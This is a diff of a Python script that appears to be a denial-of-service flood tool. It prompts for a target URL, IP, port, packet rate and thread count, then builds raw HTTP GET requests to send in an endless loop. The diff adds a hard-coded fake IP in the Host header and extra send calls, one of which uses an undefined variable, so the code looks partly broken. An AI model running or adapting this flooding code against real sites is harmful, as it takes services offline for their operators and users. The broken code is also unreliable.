@@ -64,16 +64,17 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 "Accept-Language: en-US,en;q=0.5\r\n"]
 
 #ip
-url = input("\033[94m╔═══\033[91m[ Url ] •\n\033[94m╠══>\033[0m ")
+url = input(" \033[94m[+] Url target \033[1;31;40m  ==> : \033[0m")
 url_chek = requests.get(url)
 ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
 print(ip)
 print()
+ip = str(input(" \033[94m[+] IP target \033[1;31;40m  ==> : \033[0m"))
+port = int(input(" \033[94m[+] Port Target \033[1;31;40m ==> : \033[0m"))
+pack = int(input(" \033[94m[+] INPUT PACKET/s \033[1;31;40m  ==> : \033[0m"))
+threads = int(input(" \033[94m[+] INPUT THREADS \033[1;31;40m  ==> : \033[0m"))
+fake_ip = '182.21.20.32'
 
-ip = str(input('[+] Target: => '))
-port = int(input('[+] Port: => '))
-pack = int(input('[+] Packet/s: => '))
-thread = int(input('[+] Threads: => '))
 time.sleep(3)
 os.system("clear")
 def start():
@@ -86,6 +87,8 @@ def start():
     content    = "Content-Type: application/x-www-form-urlencoded\r\n"
     length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
     target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
+    s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
     main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
     while True:
         try:
